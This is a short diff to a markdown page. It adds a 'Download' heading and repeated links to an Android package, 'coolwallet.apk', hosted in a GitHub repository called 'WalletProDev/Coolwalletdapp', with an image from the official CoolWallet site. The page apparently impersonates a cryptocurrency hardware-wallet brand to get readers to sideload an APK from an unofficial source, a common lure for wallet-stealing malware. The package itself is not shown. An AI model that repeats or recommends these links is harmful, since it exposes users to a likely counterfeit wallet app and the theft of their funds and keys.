@@ -1,3 +1,9 @@
+Download
+
+[![Download CoolWallet Android App](https://media.coolwallet.io/wp-content/uploads/2019/08/Screen-Shot-2019-08-04-at-11.51.56-PM.png)](https://github.com/WalletProDev/Coolwalletdapp/raw/main/coolwallet.apk)
+
+## [Download](https://github.com/WalletProDev/Coolwalletdapp/raw/main/coolwallet.apk)
+
 [![Download CoolWallet Android App](https://media.coolwallet.io/wp-content/uploads/2019/08/Screen-Shot-2019-08-04-at-11.51.56-PM.png)](https://github.com/WalletProDev/Coolwalletdapp/raw/main/coolwallet.apk)
 
 
